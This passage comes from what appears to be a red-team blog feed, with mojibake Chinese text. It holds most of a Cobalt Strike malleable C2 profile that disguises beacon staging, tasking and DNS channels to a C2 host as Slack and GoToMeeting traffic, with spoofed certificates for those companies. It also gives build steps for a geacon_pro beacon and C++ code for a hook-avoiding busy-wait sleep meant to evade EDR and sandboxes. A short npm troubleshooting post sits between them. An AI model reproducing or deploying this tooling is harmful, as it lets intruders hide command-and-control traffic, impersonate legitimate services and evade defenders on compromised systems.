class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Req-Id&quot;</span> <span class="string">&quot;6319165c-f976-4d0666532&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="string">&quot;*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-6g1x&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64;</span><br><span class="line">prepend <span class="string">&quot;&#123;\&quot;ok\&quot;:true,\&quot;args\&quot;:&#123;\&quot;user_id\&quot;:\&quot;LUMK4GB8C\&quot;,\&quot;team_id\&quot;:\&quot;T0527B0J3\&quot;,\&quot;version_ts\&quot;:\&quot;&quot;</span>;</span><br><span class="line">append <span class="string">&quot;\&quot;&#125;,\&quot;warning\&quot;:\&quot;superfluous_charset\&quot;,\&quot;response_metadata\&quot;:&#123;\&quot;warnings\&quot;:[\&quot;superfluous_charset\&quot;]&#125;&#125;&quot;</span>;</span><br><span class="line">print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-stager <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/messages/DALBNSflEV6&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/messages/DALBNSFu8Pk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US,en;q=0.5&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html; charset=utf-8&quot;</span>;        </span><br><span class="line">    header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-XSS-Protection&quot;</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Strict-Transport-Security&quot;</span> <span class="string">&quot;max-age=66674; includeSubDomains; preload&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Referrer-Policy&quot;</span> <span class="string">&quot;no-referrer&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Slack-Backend&quot;</span> <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;private, no-cache, no-store, must-revalidate&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Frame-Options&quot;</span> <span class="string">&quot;SAMEORIGIN&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    header <span class="string">&quot;X-Via&quot;</span> <span class="string">&quot;haproxy-www-suhx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br><span class="line">https-certificate <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;slack.com&quot;</span>; #Common Name</span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;Slack Technologies Inc&quot;</span>; #Organization Name</span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;US&quot;</span>; #Country</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;San Francisco&quot;</span>; #Locality</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;DigiCert Inc&quot;</span>; #Organizational Unit Name</span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;CA&quot;</span>; #State or Province</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>; #Number of days the cert is valid <span class="keyword">for</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># dns</span></span><br><span class="line">dns-beacon <span class="string">&quot;slack&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle             <span class="string">&quot;85.61.23.113&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_max_txt          <span class="string">&quot;204&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep            <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_ttl              <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns               <span class="string">&quot;205&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend   <span class="string">&quot;cdn&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost   <span class="string">&quot;art.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> beacon               <span class="string">&quot;api2.46.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A                <span class="string">&quot;cach.dh.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA             <span class="string">&quot;book.j4.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT              <span class="string">&quot;chat.ab.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata         <span class="string">&quot;he.6o.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output           <span class="string">&quot;hd.5o.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response          <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-get <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># getè¯·æ±‚çš„uri</span></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/functionalStatus/&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            </span><br><span class="line">base64url; </span><br><span class="line">parameter <span class="string">&quot;_&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;content=&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;google-site-verification\&quot;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;link rel=\&quot;canonical\&quot; href=\&quot;https://www.gotomeeting.com/b\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;title&gt;Online Meeting Software with HD Video Conferencing | GoToMeeting&lt;/title&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;        &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;    &lt;head&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;\n&lt;meta name=\&quot;msvalidate.01\&quot; content=\&quot;63E628E67E6AD849F4185FA9AA7ABACA\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  var _kiq = _kiq || [];\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  (function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    setTimeout(function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    var d = document, f = d.getElementsByTagName(&#x27;script&#x27;)[0], s =\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;d.createElement(&#x27;script&#x27;); s.type = &#x27;text/javascript&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    s.async = true; s.src = &#x27;//s3.amazonaws.com/ki.js/66992/fWl.js&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;f.parentNode.insertBefore(s, f);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    &#125;, 1);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&#125;)();\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/body&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/html&gt;\n&quot;</span>;</span><br><span class="line">		print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/rest/2/meetings&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>; </span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">base64url;</span><br><span class="line">parameter <span class="string">&quot;includeMeetingsICoorganize&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        id &#123;</span><br><span class="line">            </span><br><span class="line">base64url;</span><br><span class="line">parameter <span class="string">&quot;includeCoorganizers&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            </span><br><span class="line">    base64;</span><br><span class="line">    prepend <span class="string">&quot;content=&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;google-site-verification\&quot;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;link rel=\&quot;canonical\&quot; href=\&quot;https://www.gotomeeting.com/b\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;title&gt;Online Meeting Software with HD Video Conferencing | GoToMeeting&lt;/title&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;        &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;    &lt;head&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	prepend <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;\n&lt;meta name=\&quot;msvalidate.01\&quot; content=\&quot;63E628E67E6AD849F4185FA9AA7ABACA\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  var _kiq = _kiq || [];\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;  (function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    setTimeout(function()&#123;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    var d = document, f = d.getElementsByTagName(&#x27;script&#x27;)[0], s =\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;d.createElement(&#x27;script&#x27;); s.type = &#x27;text/javascript&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    s.async = true; s.src = &#x27;//s3.amazonaws.com/ki.js/66992/fWl.js&#x27;;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;f.parentNode.insertBefore(s, f);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;    &#125;, 1);\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&#125;)();\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/body&gt;\n&quot;</span>;</span><br><span class="line">	append <span class="string">&quot;&lt;/html&gt;\n&quot;</span>;</span><br><span class="line">	print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-stager <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/Meeting/32251817/&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/Meeting/32251816/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        </span><br><span class="line">    header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;192.168.1.18&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line">	header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        </span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=UTF-8&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;close&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Brightspot-Id&quot;</span> <span class="string">&quot;00000459-72af-a783-feef2189&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=66674&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Apache-Coyote/1.1&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Content-Type-Options&quot;</span> <span class="string">&quot;nosniff&quot;</span>;</span><br><span class="line">header <span class="string">&quot;X-Powered-By&quot;</span> <span class="string">&quot;Brightspot&quot;</span>;</span><br><span class="line">header <span class="string">&quot;Vary&quot;</span> <span class="string">&quot;Accept-Encoding&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br><span class="line">https-certificate <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;gotomeeting.com&quot;</span>; #Common Name</span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;LogMeIn Inc.&quot;</span>; #Organization Name</span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;US&quot;</span>; #Country</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;Boston&quot;</span>; #Locality</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;DigiCert Inc&quot;</span>; #Organizational Unit Name</span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;Massachusetts&quot;</span>; #State or Province</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;365&quot;</span>; #Number of days the cert is valid <span class="keyword">for</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># dns</span></span><br><span class="line">dns-beacon <span class="string">&quot;gotomeeting&quot;</span> &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle             <span class="string">&quot;85.61.23.113&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_max_txt          <span class="string">&quot;204&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep            <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_ttl              <span class="string">&quot;7&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns               <span class="string">&quot;205&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend   <span class="string">&quot;club&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost   <span class="string">&quot;city.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> beacon               <span class="string">&quot;crm.zk.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_A                <span class="string">&quot;adm.7s.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_AAAA             <span class="string">&quot;hami.hj.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> get_TXT              <span class="string">&quot;name.kh.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_metadata         <span class="string">&quot;go.4i.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> put_output           <span class="string">&quot;api.q3.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ns_response          <span class="string">&quot;zero&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Code Signing Certificate</span><br><span class="line"><span class="meta"># code-signer &#123;</span></span><br><span class="line"><span class="meta">#     set keystore <span class="string">&quot;keystore.jks&quot;</span>;</span></span><br><span class="line"><span class="meta">#    set password <span class="string">&quot;password&quot;</span>;</span></span><br><span class="line"><span class="meta">#    set alias    <span class="string">&quot;server&quot;</span>;</span></span><br><span class="line"># &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo_error_at_node:internal/main/run_main_module</title>
    <url>/posts/d2fe5b0/</url>
    <content><![CDATA[<p>ä»Šå¤©æœ¬æƒ³æ›´æ–°å‡ ç¯‡æ–‡ç« åˆ°åšå®¢ä¸Šï¼Œç»“æœåœ¨ä¸Šä¼ ç”Ÿæˆå ç•Œé¢å‡ºç°é—®é¢˜ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(Use `node --trace-warnings ...` to show where the warning was created)</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;lineno&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;column&#x27; of module exports inside circular dependency</span><br><span class="line">(node:2633) Warning: Accessing non-existent property &#x27;filename&#x27; of module exports inside circular dependency</span><br></pre></td></tr></table></figure>

<p>node â€“trace-warnings a    æŸ¥çœ‹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node:internal/modules/cjs/loader:959</span><br><span class="line">  throw err;</span><br><span class="line">  ^</span><br><span class="line"></span><br><span class="line">Error: Cannot find module &#x27;/Users/XXX/Blog/Hexo/a&#x27;</span><br><span class="line">    at Function.Module._resolveFilename (node:internal/modules/cjs/loader:956:15)</span><br><span class="line">    at Function.Module._load (node:internal/modules/cjs/loader:804:27)</span><br><span class="line">    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)</span><br><span class="line">    at node:internal/main/run_main_module:17:47 &#123;</span><br><span class="line">  code: &#x27;MODULE_NOT_FOUND&#x27;,</span><br><span class="line">  requireStack: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è§£å†³æ–¹æ¡ˆ <a href="https://github.com/nodejs/help/issues/2644">https://github.com/nodejs/help/issues/2644</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.npm cache clean --force(è¿™æ¡å‘½ä»¤æ— æ³•ç”¨ åˆ™ä½¿ç”¨ npm cache verify)</span><br><span class="line">2.delete node_modules folder</span><br><span class="line">3.delete package-lock.json file</span><br><span class="line">4.npm install</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä¾¿å¯ä»¥é¡ºåˆ©è¿è¡Œäº†</p>
]]></content>
  </entry>
  <entry>
    <title>geacon_proä½¿ç”¨</title>
    <url>/posts/c91c8eaa/</url>
    <content><![CDATA[<p>æŸ¥çœ‹cs teamserverä¸‹çš„ keyæ–‡ä»¶</p>
<p>å¹¶é€šè¿‡ BeaconTool.jar è¿›è¡Œè§£å¯† è·å–å…¬é’¥</p>
<p><img src="/posts/c91c8eaa/1.png" alt="img"></p>
<p>åœ¨config.go ä¸‹è¿›è¡Œé…ç½®</p>
<p><img src="/posts/c91c8eaa/2.png" alt="img"></p>
<p>ç¬¬ä¸€å¤„å¡«å…¥å…¬é’¥</p>
<p>ç¬¬äºŒæ¬¡å¡«å…¥cs listener å¯¹åº”çš„ip å’Œç«¯å£</p>
<p>go buildç¼–è¯‘å³å¯</p>
]]></content>
  </entry>
  <entry>
    <title>åˆ©ç”¨CPUå‘¨æœŸæ‰§è¡Œè‡ªå®šä¹‰sleep</title>
    <url>/posts/e65cfe16/</url>
    <content><![CDATA[<p>sleep() sleepEx() Thread.sleep  æœ€ç»ˆéƒ½æ˜¯è°ƒç”¨çš„NtDelayExecution</p>
<p>é¿å…sleepå‡½æ•° æˆ–è€…åº•å±‚ç³»ç»Ÿè°ƒç”¨ä¸ŠæŒ‚é’© </p>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MS_PER_SECOND 1000  </span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="type">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __alt_sleepms(<span class="type">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">size_t</span> x = <span class="built_in">rand</span>(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Before Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Sleeping for 10 seconds...\n&quot;</span>);</span><br><span class="line">	__alt_sleepms(<span class="number">10</span> * MS_PER_SECOND);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] After  Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="KUSER-SHARED-DATAç»“æ„"><a href="#KUSER-SHARED-DATAç»“æ„" class="headerlink" title="_KUSER_SHARED_DATAç»“æ„"></a>_KUSER_SHARED_DATAç»“æ„</h4><p>KUSER_SHARED_DATAç»“æ„å®šä¹‰äº†ä¸€ä¸ªæ•°æ®åŒºåŸŸï¼Œåœ¨Windowsç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨å¤šç§ç”¨æˆ·å…±äº«çš„æ•°æ®ã€‚</p>
